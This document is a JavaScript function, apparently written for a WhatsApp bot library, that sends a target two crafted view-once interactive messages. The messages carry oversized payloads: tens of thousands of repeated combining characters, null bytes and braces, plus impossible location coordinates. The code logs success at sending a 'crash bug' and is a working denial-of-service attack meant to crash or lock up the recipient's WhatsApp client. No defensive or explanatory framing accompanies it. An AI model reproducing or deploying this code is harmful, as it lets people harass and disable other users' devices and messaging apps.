async function XProtexCrashAi(target) {
    const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "</🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ͜͡\\>" + "ោ៝".repeat(20000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(20000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(20000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(20000),
                },
                
              ],
            },
          },
        },
      },
    },
    {}
    );
    
    const msg2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "</🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ͜͡\\>",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "</🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ͜͡\\>",
                address: "ោ៝".repeat(1000),
              },
            },
            body: {
              text: "</🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ͜͡\\>".repeat(20000),
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
              },
            },
          },
        },
      },
      {}
    );

    await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

  await sock.relayMessage(target, msg2.message, {
    participant: { jid: target },
    messageId: msg2.key.id
  });
  console.log(chalk.red(`Succes Sending Bug CrashLoca To ${target}`));
}